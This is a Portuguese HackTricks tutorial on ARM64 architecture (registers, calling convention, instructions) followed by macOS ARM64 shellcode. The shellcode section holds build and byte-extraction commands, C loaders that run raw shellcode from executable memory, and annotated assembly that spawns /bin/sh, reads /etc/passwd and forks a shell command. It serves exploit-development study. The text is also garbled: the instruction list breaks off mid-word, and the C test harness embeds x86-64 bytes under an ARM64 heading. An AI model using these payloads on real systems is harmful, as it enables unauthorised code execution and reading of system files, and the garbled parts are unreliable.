# Introdução ao ARM64

ARM64, também conhecido como ARMv8-A, é uma arquitetura de processador de 64 bits usada em vários tipos de dispositivos, incluindo smartphones, tablets, servidores e até mesmo alguns computadores pessoais de alta qualidade (macOS). É um produto da ARM Holdings, uma empresa conhecida por seus designs de processadores energeticamente eficientes.

### Registradores

O ARM64 tem **31 registradores de propósito geral**, rotulados de `x0` a `x30`. Cada um pode armazenar um valor de **64 bits** (8 bytes). Para operações que requerem apenas valores de 32 bits, os mesmos registradores podem ser acessados em um modo de 32 bits usando os nomes w0 a w30.

1. **`x0`** a **`x7`** - Esses são normalmente usados como registradores temporários e para passar parâmetros para sub-rotinas.
   * **`x0`** também carrega os dados de retorno de uma função.
2. **`x8`** - No kernel do Linux, `x8` é usado como o número de chamada do sistema para a instrução `svc`. **No macOS, o x16 é o usado!**
3. **`x9`** a **`x15`** - Mais registradores temporários, frequentemente usados para variáveis locais.
4. **`x16`** e **`x17`** - Registradores temporários, também usados para chamadas de função indiretas e stubs PLT (Procedure Linkage Table).
   * **`x16`** é usado como o número de chamada do sistema para a instrução **`svc`**.
5. **`x18`** - Registrador de plataforma. Em algumas plataformas, este registrador é reservado para usos específicos da plataforma.
6. **`x19`** a **`x28`** - Estes são registradores preservados pelo chamado. Uma função deve preservar os valores desses registradores para seu chamador.
7. **`x29`** - **Ponteiro de quadro**.
8. **`x30`** - Registrador de link. Ele contém o endereço de retorno quando uma instrução `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) é executada.
9. **`sp`** - **Ponteiro de pilha**, usado para acompanhar o topo da pilha.
10. **`pc`** - **Contador de programa**, que aponta para a próxima instrução a ser executada.

### Convenção de Chamada

A convenção de chamada ARM64 especifica que os **primeiros oito parâmetros** de uma função são passados nos registradores **`x0` a `x7`**. **Parâmetros adicionais** são passados na **pilha**. O **valor de retorno** é passado de volta no registrador **`x0`**, ou em **`x1`** também **se for de 128 bits**. Os registradores **`x19`** a **`x30`** e **`sp`** devem ser **preservados** em chamadas de função.

Ao ler uma função em assembly, procure o **prólogo e epílogo da função**. O **prólogo** geralmente envolve **salvar o ponteiro de quadro (`x29`)**, **configurar** um **novo ponteiro de quadro** e **alocar espaço na pilha**. O **epílogo** geralmente envolve **restaurar o ponteiro de quadro salvo** e **retornar** da função.

### Instruções Comuns

As instruções ARM64 geralmente têm o **formato `opcode dst, src1, src2`**, onde **`opcode`** é a **operação** a ser executada (como `add`, `sub`, `mov`, etc.), **`dst`** é o **registrador de destino** onde o resultado será armazenado e **`src1`** e **`src2`** são os **registradores de origem**. Valores imediatos também podem ser usados ​​no lugar de registradores de origem.

* **`mov`**: **Mover** um valor de um **registrador** para outro.
  * Exemplo: `mov x0, x1` - Isso move o valor de `x1` para `x0`.
* **`ldr`**: **Carregar** um valor da **memória** em um **registrador**.
  * Exemplo: `ldr x0, [x1]` - Isso carrega um valor da localização de memória apontada por `x1` em `x0`.
* **`str`**: **Armazenar** um valor de um **registrador** na **memória**.
  * Exemplo: `str x0, [x1]` - Isso armazena o valor em `x0` na localização de memória apontada por `x1`.
* **`ldp`**: **Carregar Par de Registradores**. Esta instrução **carrega dois registr
## macOS

### syscalls

Confira [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master).

### Shellcodes

Para compilar:

{% code overflow="wrap" %}
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Para extrair os bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\\x'$c
done
```
<detalhes>

<sumário>Código C para testar o shellcode</sumário>

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x83\xc7\x01\x48\x8d\x34\x24\x48\x89\xc6\x48\x8d\x77\x08\x48\x8d\x7f\x08\x48\x8d\x57\x10\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05";

int main(){
    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
```
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    printf("[+] SUCCESS: mmap\n");
    printf("    |-> Return = %p\n", ptr);
 
    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
    printf("[+] SUCCESS: memcpy\n");
    printf("    |-> Return = %p\n", dst);

    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

    if (status == -1) {
        perror("mprotect");
        exit(-1);
    }
    printf("[+] SUCCESS: mprotect\n");
    printf("    |-> Return = %d\n", status);

    printf("[>] Trying to execute shellcode...\n");

    sc = ptr;
    sc();
 
    return 0;
}
```
</details>

#### Shell

Retirado [**aqui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e explicado.

{% tabs %}
{% tab title="com adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:    
    adr  x0, sh_path  ; This is the address of "/bin/sh".
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="com pilha" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
    ; We are going to build the string "/bin/sh" and place it on the stack.
    
    mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
    movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
    movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
    movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

    str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

    ; Prepare arguments for the execve syscall.
    
    mov  x1, #8       ; Set x1 to 8.
    sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

    ; Make the syscall.
    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Ler com cat

O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (que na memória significa uma pilha de endereços).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the execve syscall
    sub sp, sp, #48        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, cat_path
    str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
    adr x0, passwd_path    ; Get the address of "/etc/passwd"
    str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
    str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)
    
    adr x0, cat_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59            ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar comando com sh a partir de um fork para que o processo principal não seja encerrado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the fork syscall
    mov x16, #2            ; Load the syscall number for fork (2) into x8
    svc 0                  ; Make the syscall
    cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
    beq _loop              ; If not child process, loop

    ; Prepare the arguments for the execve syscall

    sub sp, sp, #64        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, sh_path
    str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
    adr x0, sh_c_option    ; Get the address of "-c"
    str x0, [x1, #8]       ; Store the address of "-c" as the second argument
    adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
    str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
    str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)
    
    adr x0, sh_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59           ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


_exit:
    mov x16, #1            ; Load the syscall number for exit (1) into x8
    mov x0, #0             ; Set exit status code to 0
    svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) **grupo do Discord** ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
